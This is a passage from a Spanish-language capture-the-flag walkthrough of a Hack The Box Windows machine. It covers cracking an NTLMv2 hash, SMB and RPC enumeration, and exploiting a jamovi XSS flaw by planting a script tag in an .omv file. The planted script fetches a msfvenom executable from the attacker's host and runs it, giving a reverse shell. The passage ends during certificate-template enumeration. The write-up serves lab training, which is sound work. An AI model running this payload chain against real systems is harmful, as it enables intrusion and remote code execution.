  <p>En tu caso si es la primera vez que haces la máquina el hash te debe de llegar al responder pero como yo ya lo había capturado antes responder lo ignora entonces puedo volver a verlo por que guarda los hashes en una ruta.</p>
</blockquote>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>WinRM-NTLMv2-10.10.11.102.txt
localadmin::windcorp:ec8df8b609e70f41:208735772A1677823E7F75FA31D0C715:0101000000000000646B94F8C5D4DA01E2910B524E97D48700000000020008005700460056005A0001001E00570049004E002D0052005600450036005800380034004D00300045004C00040014005700460056005A002E004C004F00430041004C0003003400570049004E002D0052005600450036005800380034004D00300045004C002E005700460056005A002E004C004F00430041004C00050014005700460056005A002E004C004F00430041004C0008003000300000000000000000000000002100003BED58472DA82F8CAD355A301647ABF7E78023B354D051483303EF7C0F5FC5340A001000000000000000000000000000000000000900200048005400540050002F00310030002E00310030002E00310034002E00370034000000000000000000
</code></pre></div></div>

<ul>
  <li>Ahora ya podemos crackear el hash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
No password hashes left to crack <span class="o">(</span>see FAQ<span class="o">)</span>
❯ john <span class="nt">--show</span> hash.txt
localadmin:Secret123:windcorp:ec8df8b609e70f41:208735772A1677823E7F75FA31D0C715:0101000000000000646B94F8C5D4DA01E2910B524E97D48700000000020008005700460056005A0001001E00570049004E002D0052005600450036005800380034004D00300045004C00040014005700460056005A002E004C004F00430041004C0003003400570049004E002D0052005600450036005800380034004D00300045004C002E005700460056005A002E004C004F00430041004C00050014005700460056005A002E004C004F00430041004C0008003000300000000000000000000000002100003BED58472DA82F8CAD355A301647ABF7E78023B354D051483303EF7C0F5FC5340A001000000000000000000000000000000000000900200048005400540050002F00310030002E00310030002E00310034002E00370034000000000000000000

1 password <span class="nb">hash </span>cracked, 0 left
</code></pre></div></div>

<ul>
  <li>
    <p>Ahora tenemos credenciales <code class="language-plaintext highlighter-rouge">localadmin:Secret123</code> .</p>
  </li>
  <li>
    <p>Son correctas en la máquina real.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme smb 10.10.11.102 <span class="nt">-u</span> localadmin <span class="nt">-p</span> Secret123
SMB         10.10.11.102    445    EARTH            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:EARTH<span class="o">)</span> <span class="o">(</span>domain:windcorp.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.102    445    EARTH            <span class="o">[</span>+] windcorp.htb<span class="se">\l</span>ocaladmin:Secret123
</code></pre></div></div>

<h2 id="shell-as-diegocruz-and-user-flag">Shell as diegocruz and user flag</h2>

<ul>
  <li>Como tenemos credenciales validas podemos enumerar por RPC y podemos ver los nombres de los usuarios.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient 10.10.11.102 <span class="nt">-U</span> <span class="s1">'localadmin%Secret123'</span> <span class="nt">-c</span> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[FalkUela] rid:[0xc26]
user:[CurtisChav] rid:[0xc27]
user:[RyderRoss] rid:[0xc28]
user:[TammyLawr] rid:[0xc29]
user:[ZoePerk] rid:[0xc2a]
user:[AgnieszkaFour] rid:[0xc2b]
user:[IgorCarv] rid:[0xc2c]
user:[Denada R] rid:[0xc2d]
user:[AmyBouc] rid:[0xc2e]
user:[BaptisteCaro] rid:[0xc2f]
user:[JonathanPayn] rid:[0xc30]
user:[محمدمهدیحیدر] rid:[0xc31]
user:[AlyssiaDavi] rid:[0xc32]
user:[SusanaSoto] rid:[0xc33]
user:[IslaLatt] rid:[0xc34]
user:[KellyGran] rid:[0xc35]
user:[SkyVan <span class="o">]</span> rid:[0xc36]
user:[AnitaStro] rid:[0xc37]
user:[YasminSchm] rid:[0xc38]
user:[EvaMath] rid:[0xc39]
user:[MelodieNova] rid:[0xc3a]
user:[MareikeZiel] rid:[0xc3b]
user:[NihalKunt] rid:[0xc3c]
user:[SohamCoop] rid:[0xc3d]
user:[DarrenLong] rid:[0xc3e]
user:[ÜlküTunç] rid:[0xc3f]
user:[FelixWill] rid:[0xc40]
user:[ElizabethMarg] rid:[0xc41]
user:[AriannaGray] rid:[0xc42]
user:[تیناعلیز] rid:[0xc43]
user:[CoryMurr] rid:[0xc44]
user:[AnatoleMich] rid:[0xc45]
user:[آویننجات] rid:[0xc46]
user:[NevilleVan <span class="o">]</span> rid:[0xc47]
user:[LeanaOliv] rid:[0xc48]
user:[PhilipJørg] rid:[0xc49]
user:[FernandoMcco] rid:[0xc4a]
user:[IsabellaAnde] rid:[0xc4b]
user:[IndiraCarv] rid:[0xc4c]
user:[MartinIgle] rid:[0xc4d]
user:[SammyCald] rid:[0xc4e]
user:[PatriciaRoge] rid:[0xc4f]
user:[SamuHeik] rid:[0xc50]
user:[BrielleGinn] rid:[0xc51]
user:[HollyWatt] rid:[0xc52]
user:[GuillermoFuen] rid:[0xc53]
user:[MaltheKris] rid:[0xc54]
user:[AstridThom] rid:[0xc55]
user:[SohailaWitv] rid:[0xc56]
user:[MerithLand] rid:[0xc57]
user:[HaileyWill] rid:[0xc58]
user:[MelvinFour] rid:[0xc59]
user:[NurdanGönü] rid:[0xc5a]
user:[ElsaRaut] rid:[0xc5b]
user:[NicolaiNeub] rid:[0xc5c]
user:[GeorgeMore] rid:[0xc5d]
user:[BarthelomeusTukk] rid:[0xc5e]
user:[JustinaGöpf] rid:[0xc5f]
user:[YaseminKumc] rid:[0xc60]
user:[VanessaMart] rid:[0xc61]
user:[GabriëllaVisk] rid:[0xc62]
user:[AfetErbu] rid:[0xc63]
user:[MontserratHida] rid:[0xc64]
user:[CourtneyRose] rid:[0xc65]
user:[AbigailKell] rid:[0xc66]
user:[TomGrah] rid:[0xc67]
user:[LouisonThom] rid:[0xc68]
user:[RogerSanc] rid:[0xc69]
user:[مهدیسکریم] rid:[0xc6a]
user:[ValentinGome] rid:[0xc6b]
user:[OliviaSalm] rid:[0xc6c]
user:[DennisWade] rid:[0xc6d]
user:[DenyVan <span class="o">]</span> rid:[0xc6e]
user:[CecilieMads] rid:[0xc6f]
user:[CecilieChri] rid:[0xc70]
user:[AugusteGira] rid:[0xc71]
user:[LærkeOlse] rid:[0xc72]
user:[AiméeRodr] rid:[0xc73]
user:[VernonGuti] rid:[0xc74]
user:[AliGerl] rid:[0xc75]
user:[BuseNuma] rid:[0xc76]
user:[ClaraMoli] rid:[0xc77]
user:[AdemPekt] rid:[0xc78]
user:[JacobTurn] rid:[0xc79]
user:[InmaculadaGuer] rid:[0xc7a]
user:[VickieGuti] rid:[0xc7b]
user:[ShellyGran] rid:[0xc7c]
user:[EmmaPoul] rid:[0xc7d]
user:[HeatherHarr] rid:[0xc7e]
user:[VilmaKjel] rid:[0xc7f]
user:[LeanaEnge] rid:[0xc80]
user:[UmutAkgü] rid:[0xc81]
user:[JorianAppe] rid:[0xc82]
user:[DavePerk] rid:[0xc83]
user:[IsabelleWang] rid:[0xc84]
user:[KathleenMyer] rid:[0xc85]
user:[NotburgaKäfe] rid:[0xc86]
user:[RasmusRant] rid:[0xc87]
user:[MohamedAria] rid:[0xc88]
user:[AbigailGray] rid:[0xc89]
user:[JuliaPell] rid:[0xc8a]
user:[ReginaldoJesu] rid:[0xc8b]
user:[HaileyFren] rid:[0xc8c]
user:[EzraBrow] rid:[0xc8d]
user:[EvelynNesh] rid:[0xc8e]
user:[SarahScot] rid:[0xc8f]
user:[ViljamiLatv] rid:[0xc90]
user:[LoganDixo] rid:[0xc91]
user:[کیاناقاسم] rid:[0xc92]
user:[MillePede] rid:[0xc93]
user:[طاهازارع] rid:[0xc94]
user:[LenniMart] rid:[0xc95]
user:[CesarLoza] rid:[0xc96]
user:[SebastianJoha] rid:[0xc97]
user:[GundelDree] rid:[0xc98]
user:[Hans-WolfgangTill] rid:[0xc99]
user:[EdwardGilb] rid:[0xc9a]
user:[LoganWalk] rid:[0xc9b]
user:[TakeEdel] rid:[0xc9c]
user:[ZehraWeis] rid:[0xc9d]
user:[LolaDani] rid:[0xc9e]
user:[OliverTikk] rid:[0xc9f]
user:[SeanCarr] rid:[0xca0]
user:[JoseSmyt] rid:[0xca1]
user:[AntonKaup] rid:[0xca2]
user:[FlorenceRamo] rid:[0xca3]
user:[DavidLecl] rid:[0xca4]
user:[ZakariaeVan <span class="o">]</span> rid:[0xca5]
user:[FranciscoMeun] rid:[0xca6]
user:[MeganScot] rid:[0xca7]
user:[LyamMass] rid:[0xca8]
user:[OlveSund] rid:[0xca9]
user:[AndreaLefe] rid:[0xcaa]
user:[JuddSimm] rid:[0xcab]
user:[KübraKoço] rid:[0xcac]
user:[DiegoCruz] rid:[0xcad]
user:[MaryMaso] rid:[0xcae]
user:[EmmettØstm] rid:[0xcaf]
user:[LyamRodr] rid:[0xcb0]
user:[UliBeut] rid:[0xcb1]
user:[RileyMill] rid:[0xcb2]
user:[یلداكامي] rid:[0xcb3]
user:[AlexisRoll] rid:[0xcb4]
user:[LinneaLait] rid:[0xcb5]
user:[LenniHarj] rid:[0xcb6]
user:[TimWelc] rid:[0xcb7]
user:[JoaquinLoza] rid:[0xcb8]
user:[ThomasPerr] rid:[0xcb9]
user:[VilhoRaja] rid:[0xcba]
user:[KittySton] rid:[0xcbb]
user:[MucahitVan <span class="o">]</span> rid:[0xcbc]
user:[RicardoHunt] rid:[0xcbd]
user:[ElsaDuma] rid:[0xcbe]
user:[RalphMaiw] rid:[0xcbf]
user:[JordiGuer] rid:[0xcc0]
user:[LutzHell] rid:[0xcc1]
user:[LucyFont] rid:[0xcc2]
user:[Afonso HenriquesMend] rid:[0xcc3]
user:[Karl-HermannSchl] rid:[0xcc4]
user:[TorstenBätz] rid:[0xcc5]
user:[DewyLier] rid:[0xcc6]
user:[کیاناپارس] rid:[0xcc7]
user:[JonathanBeni] rid:[0xcc8]
user:[MitchellHill] rid:[0xcc9]
user:[GaëtanAube] rid:[0xcca]
user:[حامدرضای] rid:[0xccb]
user:[ZéliaTeix] rid:[0xccc]
user:[LícioMora] rid:[0xccd]
user:[DannyWeis] rid:[0xcce]
user:[SofieKind] rid:[0xccf]
user:[MarieJoha] rid:[0xcd0]
user:[LeanneYoun] rid:[0xcd1]
user:[EemilLepp] rid:[0xcd2]
user:[LiamMore] rid:[0xcd3]
user:[BarbaraWebb] rid:[0xcd4]
user:[localadmin] rid:[0xcd9]
</code></pre></div></div>

<ul>
  <li>Podríamos probar un ASREPRoast Attack <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast</a> pero al parecer hay un problema con el puerto 88 y no se ejecuta.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-GetNPUsers windcorp.htb/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt <span class="nt">-debug</span>
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span>+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
<span class="o">[</span>+] Trying to connect to KDC at WINDCORP.HTB:88
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient 10.10.11.102 <span class="nt">-U</span> <span class="s1">'localadmin%Secret123'</span> <span class="nt">-c</span> enumdomusers | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s2">"</span><span class="se">\[</span><span class="s2">.*?</span><span class="se">\]</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"0x"</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'[]'</span> <span class="o">&gt;</span> users.txt
❯ <span class="nb">wc</span> <span class="nt">-l</span> users.txt
179 users.txt
</code></pre></div></div>

<ul>
  <li>Así que vamos a listar recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme smb 10.10.11.102 <span class="nt">-u</span> localadmin <span class="nt">-p</span> Secret123  <span class="nt">--shares</span>
SMB         10.10.11.102    445    EARTH            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:EARTH<span class="o">)</span> <span class="o">(</span>domain:windcorp.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.102    445    EARTH            <span class="o">[</span>+] windcorp.htb<span class="se">\l</span>ocaladmin:Secret123
SMB         10.10.11.102    445    EARTH            <span class="o">[</span>+] Enumerated shares
SMB         10.10.11.102    445    EARTH            Share           Permissions     Remark
SMB         10.10.11.102    445    EARTH            <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.11.102    445    EARTH            ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.11.102    445    EARTH            C<span class="nv">$ </span>                             Default share
SMB         10.10.11.102    445    EARTH            CertEnroll      READ            Active Directory Certificate Services share
SMB         10.10.11.102    445    EARTH            IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.10.11.102    445    EARTH            NETLOGON        READ            Logon server share
SMB         10.10.11.102    445    EARTH            Shared          READ
SMB         10.10.11.102    445    EARTH            SYSVOL          READ            Logon server share
</code></pre></div></div>

<ul>
  <li>Tenemos privilegios de lectura en <code class="language-plaintext highlighter-rouge">Shared</code> vamos a ver que hay dentro.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient //10.10.11.102/Shared <span class="nt">-U</span> windcorp.htb/localadmin Secret123
Password <span class="k">for</span> <span class="o">[</span>WINDCORP.HTB<span class="se">\l</span>ocaladmin]:
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
  <span class="nb">.</span>                                   D        0  Wed Apr 28 10:06:06 2021
  ..                                  D        0  Wed Apr 28 10:06:06 2021
  Documents                           D        0  Mon Apr 26 23:09:25 2021
  Software                            D        0  Thu Jul 22 13:14:16 2021

		9034239 blocks of size 4096. 3227232 blocks available
</code></pre></div></div>

<ul>
  <li>
    <p>Vemos archivos <code class="language-plaintext highlighter-rouge">.omv</code> <a href="https://docs.jamovi.org/_pages/info_file-format.html">https://docs.jamovi.org/_pages/info_file-format.html</a>.</p>
  </li>
  <li>
    <p>En la web de jamovi nos dicen que hay archivos en un zip.</p>
  </li>
  <li>
    <p>Vamos a descargarnos los archivos.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\D</span>ocuments<span class="se">\A</span>nalytics<span class="se">\&gt;</span> mget <span class="k">*</span>.omv
Get file Big 5.omv? y
getting file <span class="se">\D</span>ocuments<span class="se">\A</span>nalytics<span class="se">\B</span>ig 5.omv of size 6455 as Big 5.omv <span class="o">(</span>14.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 14.1 KiloBytes/sec<span class="o">)</span>
Get file Bugs.omv? y
getting file <span class="se">\D</span>ocuments<span class="se">\A</span>nalytics<span class="se">\B</span>ugs.omv of size 2897 as Bugs.omv <span class="o">(</span>6.6 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 10.4 KiloBytes/sec<span class="o">)</span>
Get file Tooth Growth.omv? y
getting file <span class="se">\D</span>ocuments<span class="se">\A</span>nalytics<span class="se">\T</span>ooth Growth.omv of size 2142 as Tooth Growth.omv <span class="o">(</span>4.9 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 8.6 KiloBytes/sec<span class="o">)</span>
Get file Whatif.omv? y
getting file <span class="se">\D</span>ocuments<span class="se">\A</span>nalytics<span class="se">\W</span>hatif.omv of size 2841 as Whatif.omv <span class="o">(</span>6.5 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 8.1 KiloBytes/sec<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vemos que en este archivo es donde se encuentran los archivos que nos decían en la web.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ 7z l Whatif.omv

7-Zip 23.01 <span class="o">(</span>x64<span class="o">)</span> : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2023 Igor Pavlov : 2023-06-20
 64-bit <span class="nv">locale</span><span class="o">=</span>C.UTF-8 Threads:128 OPEN_MAX:1024

Scanning the drive <span class="k">for </span>archives:
1 file, 2841 bytes <span class="o">(</span>3 KiB<span class="o">)</span>

Listing archive: Whatif.omv

<span class="nt">--</span>
Path <span class="o">=</span> Whatif.omv
Type <span class="o">=</span> zip
Physical Size <span class="o">=</span> 2841

   Date      Time    Attr         Size   Compressed  Name
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2021-04-27 11:38:38 .....          106           74  META-INF/MANIFEST.MF
2021-04-27 11:38:38 .....         2505          823  index.html
2021-04-27 11:38:40 .....         1575          317  metadata.json
2021-04-27 11:38:40 .....          114           76  xdata.json
2021-04-27 11:38:40 .....         5400          871  data.bin
2021-04-27 11:38:40 .....           50           46  01 empty/analysis
<span class="nt">-------------------</span> <span class="nt">-----</span> <span class="nt">------------</span> <span class="nt">------------</span>  <span class="nt">------------------------</span>
2021-04-27 11:38:40               9750         2207  6 files
</code></pre></div></div>

<ul>
  <li>Si vemos con la herramienta <code class="language-plaintext highlighter-rouge">smbcacls</code> los privilegios vemos que los usuarios tienen privilegio FULL en el directorio donde nos descargamos todo eso significa que podemos escribir dentro.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbcacls <span class="nt">-U</span> localadmin%Secret123 <span class="s2">"//windcorp.htb/Shared"</span> <span class="s2">"Documents/Analytics"</span>
REVISION:1
CONTROL:SR|DI|DP
OWNER:WINDCORP<span class="se">\D</span>iegoCruz
GROUP:WINDCORP<span class="se">\D</span>omain Users
ACL:BUILTIN<span class="se">\U</span>sers:ALLOWED/OI|CI/FULL
ACL:NT AUTHORITY<span class="se">\S</span>YSTEM:ALLOWED/OI|CI|I/FULL
ACL:BUILTIN<span class="se">\A</span>dministrators:ALLOWED/OI|CI|I/FULL
ACL:BUILTIN<span class="se">\U</span>sers:ALLOWED/OI|CI|I/READ
ACL:BUILTIN<span class="se">\U</span>sers:ALLOWED/CI|I/0x00000004
ACL:BUILTIN<span class="se">\U</span>sers:ALLOWED/CI|I/0x00000002
ACL:WINDCORP<span class="se">\D</span>iegoCruz:ALLOWED/I/FULL
ACL:CREATOR OWNER:ALLOWED/OI|CI|IO|I/0x10000000
</code></pre></div></div>

<ul>
  <li>Vamos a descomprimir para examinar los archivos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ unzip Whatif.omv
Archive:  Whatif.omv
  inflating: META-INF/MANIFEST.MF
  inflating: index.html
  inflating: metadata.json
  inflating: xdata.json
  inflating: data.bin
  inflating: 01 empty/analysis
</code></pre></div></div>

<ul>
  <li>
    <p>Si buscamos vulnerabilidades sobre esto encontramos un CVE sobre un XSS <a href="https://github.com/theart42/cves/blob/master/CVE-2021-28079/CVE-2021-28079.md">https://github.com/theart42/cves/blob/master/CVE-2021-28079/CVE-2021-28079.md</a>.</p>
  </li>
  <li>
    <p>Aquí nos dicen como explotarlo <a href="https://github.com/g33xter/CVE-2021-28079">https://github.com/g33xter/CVE-2021-28079</a>.</p>
  </li>
  <li>
    <p>La vulnerabilidad ocurre en el campo “name”.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>metadata.json | jq | <span class="nb">head</span>
<span class="o">{</span>
  <span class="s2">"dataSet"</span>: <span class="o">{</span>
    <span class="s2">"rowCount"</span>: 150,
    <span class="s2">"columnCount"</span>: 5,
    <span class="s2">"removedRows"</span>: <span class="o">[]</span>,
    <span class="s2">"addedRows"</span>: <span class="o">[]</span>,
    <span class="s2">"fields"</span>: <span class="o">[</span>
      <span class="o">{</span>
        <span class="s2">"name"</span>: <span class="s2">"Sepal.Length"</span>,
        <span class="s2">"id"</span>: 1,
</code></pre></div></div>

<ul>
  <li>
    <p>En el POC nos dicen que podemos cargar un archivo <code class="language-plaintext highlighter-rouge">.js</code> en ese campo.</p>
  </li>
  <li>
    <p>Vamos a editarlo para que nos cargue nuestro propio <code class="language-plaintext highlighter-rouge">.js</code>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>metadata.json | jq | <span class="nb">head</span>
<span class="o">{</span>
  <span class="s2">"dataSet"</span>: <span class="o">{</span>
    <span class="s2">"rowCount"</span>: 150,
    <span class="s2">"columnCount"</span>: 5,
    <span class="s2">"removedRows"</span>: <span class="o">[]</span>,
    <span class="s2">"addedRows"</span>: <span class="o">[]</span>,
    <span class="s2">"fields"</span>: <span class="o">[</span>
      <span class="o">{</span>
        <span class="s2">"name"</span>: <span class="s2">"&lt;script src=</span><span class="se">\"</span><span class="s2">http://10.10.14.74/yiyi.js</span><span class="se">\"</span><span class="s2">&gt;&lt;/script&gt;"</span>,
        <span class="s2">"id"</span>: 1,
</code></pre></div></div>

<ul>
  <li>Ahora vamos a comprimir todo otra vez para meterlo en el recurso compartido ya que tenemos privilegios “se fueron algunos archivos que tenia que no tiene nada que ver pero no importa”.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ zip <span class="nt">-r</span> Whatif.omv <span class="nb">.</span>
updating: META-INF/MANIFEST.MF <span class="o">(</span>deflated 30%<span class="o">)</span>
updating: index.html <span class="o">(</span>deflated 67%<span class="o">)</span>
updating: metadata.json <span class="o">(</span>deflated 78%<span class="o">)</span>
updating: xdata.json <span class="o">(</span>deflated 33%<span class="o">)</span>
updating: data.bin <span class="o">(</span>deflated 84%<span class="o">)</span>
updating: 01 empty/analysis <span class="o">(</span>deflated 8%<span class="o">)</span>
  adding: Tooth Growth.omv <span class="o">(</span>deflated 14%<span class="o">)</span>
  adding: shell.exe <span class="o">(</span>deflated 75%<span class="o">)</span>
  adding: vnp <span class="o">(</span>deflated 5%<span class="o">)</span>
  adding: hash.txt <span class="o">(</span>deflated 62%<span class="o">)</span>
  adding: req.txt <span class="o">(</span>deflated 23%<span class="o">)</span>
  adding: Big 5.omv <span class="o">(</span>deflated 5%<span class="o">)</span>
  adding: 01 empty/ <span class="o">(</span>stored 0%<span class="o">)</span>
  adding: chisel_1.9.1_linux_amd64 <span class="o">(</span>deflated 59%<span class="o">)</span>
  adding: chisel.exe <span class="o">(</span>deflated 59%<span class="o">)</span>
  adding: creds.txt <span class="o">(</span>stored 0%<span class="o">)</span>
  adding: Captura.cap <span class="o">(</span>deflated 48%<span class="o">)</span>
  adding: users.txt <span class="o">(</span>deflated 34%<span class="o">)</span>
  adding: Bugs.omv <span class="o">(</span>deflated 10%<span class="o">)</span>
  adding: META-INF/ <span class="o">(</span>stored 0%<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora vamos a crear el archivo <code class="language-plaintext highlighter-rouge">.js</code> para enviarnos una reverse shell vamos a usar el .exe que ya teníamos con <code class="language-plaintext highlighter-rouge">msfvenom</code> para que lo guarde en la ruta <code class="language-plaintext highlighter-rouge">ProgramData</code> y después lo ejecute.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>yiyi.js
require<span class="o">(</span><span class="s1">'child_process'</span><span class="o">)</span>.exec<span class="o">(</span><span class="s1">'curl 10.10.14.74/shell.exe -o C:\\ProgramData\\shell.exe &amp;&amp; C:\\ProgramData\\shell.exe'</span><span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Ahora ejecutamos un servidor http con python3 para que lo descargue.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</code></pre></div></div>

<ul>
  <li>Ahora metemos el comprimido en la carpeta.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-smbclient windcorp.htb/localadmin:Secret123@earth.windcorp.htb
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

Type <span class="nb">help </span><span class="k">for </span>list of commands
<span class="c"># use Shared</span>
<span class="c"># cd Documents\Analytics</span>
<span class="c"># put Whatif.omv</span>
</code></pre></div></div>

<ul>
  <li>Y nos ponemos en escucha para esperar que se ejecute.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvnp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Una vez ejecutado todo nos llega la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.11.102 - - <span class="o">[</span>14/Jul/2024 14:06:05] <span class="s2">"GET /yiyi.js HTTP/1.1"</span> 200 -
10.10.11.102 - - <span class="o">[</span>14/Jul/2024 14:06:05] <span class="s2">"GET /shell.exe HTTP/1.1"</span> 200 -
</code></pre></div></div>

<ul>
  <li>Nos llega la shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.74] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.102] 50589
Windows PowerShell running as user diegocruz on EARTH
Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.


PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">whoami
</span>windcorp<span class="se">\d</span>iegocruz
PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<ul>
  <li>Podemos ver la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\d</span>iegocruz<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
604f02b0879f8657d4e73b20efb04851
PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<h2 id="escalada-de-privilegios-and-root-flag">Escalada de privilegios and root flag</h2>

<ul>
  <li>
    <p>Si recordamos en los recursos compartidos de SMB encontramos una recurso llamado <code class="language-plaintext highlighter-rouge">CertEnroll</code> que funciona para el despliegue de certificados.</p>
  </li>
  <li>
    <p>Podemos usar Certify.exe para buscar <code class="language-plaintext highlighter-rouge">templates</code> vulnerables como ya lo hemos hecho en otras máquinas <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries</a>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; .<span class="se">\C</span>ertify.exe find /vulnerable /currentuser

   _____          _   _  __
  / ____|        | | <span class="o">(</span>_<span class="o">)</span>/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ <span class="se">\ </span><span class="s1">'__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using current user'</span>s unrolled group SIDs <span class="k">for </span>vulnerability checks.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using the search base <span class="s1">'CN=Configuration,DC=windcorp,DC=htb'</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Listing info about the Enterprise CA <span class="s1">'windcorp-CA'</span>

    Enterprise CA Name            : windcorp-CA
    DNS Hostname                  : earth.windcorp.htb
    FullName                      : earth.windcorp.htb<span class="se">\w</span>indcorp-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : <span class="nv">CN</span><span class="o">=</span>windcorp-CA, <span class="nv">DC</span><span class="o">=</span>windcorp, <span class="nv">DC</span><span class="o">=</span>htb
    Cert Thumbprint               : 3C0BAA04CCB852BB7703BB662CEF4A1FB9B54A39
    Cert Serial                   : 7DF2D3B3A1A4B8B5484E459E1D5CA15D
    Cert Start Date               : 5/24/2021 7:48:07 PM
    Cert End Date                 : 1/5/2124 6:40:41 PM
    Cert Chain                    : <span class="nv">CN</span><span class="o">=</span>windcorp-CA,DC<span class="o">=</span>windcorp,DC<span class="o">=</span>htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
